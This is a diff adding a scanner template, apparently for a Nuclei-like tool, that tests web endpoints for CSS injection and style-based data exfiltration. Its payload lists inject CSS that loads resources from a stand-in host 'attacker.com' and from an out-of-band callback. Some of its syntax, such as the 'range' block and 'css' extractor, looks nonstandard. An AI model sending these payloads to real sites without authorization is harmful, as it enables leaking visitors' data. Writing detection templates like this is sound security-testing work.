@@ -1,0 +1,44 @@
+id: css-injection-style
+name: "CSS Injection / Style-based Data Exfiltration"
+severity: "medium"
+tags: [css, injection, xss]
+description: |
+  检测 CSS 注入漏洞，可用于数据外泄。
+  使用 CSS 提取器和 range 循环。
+
+http:
+  - raw: |
+      GET /api/theme?name={{css_payload}} HTTP/1.1
+      Host: {{Hostname}}
+    range:
+      key: "css_payload"
+      values:
+        - "*/{color:red}"
+        - "*/{background:url(http://attacker.com)}"
+        - "*/{content:'test'}"
+        - "@import url('http://attacker.com/style.css')"
+        - "* {behavior:url(http://attacker.com/xss.htc)}"
+    matchers:
+      - type: status
+        status: [200]
+      - type: dsl
+        dsl:
+          - "contains(body, 'color')"
+          - "contains(body, 'background')"
+          - "contains(body, 'import')"
+
+  - raw: |
+      GET /page?style={{css_payload}} HTTP/1.1
+      Host: {{Hostname}}
+    range:
+      key: "css_payload"
+      values:
+        - ".test{background:url(http://{{oob}})}"
+        - "*{content:'{{oob}}'}"
+    matchers:
+      - type: status
+        status: [200]
+    extractors:
+      - name: "extracted_data"
+        type: "css"
+        css: [".test"]
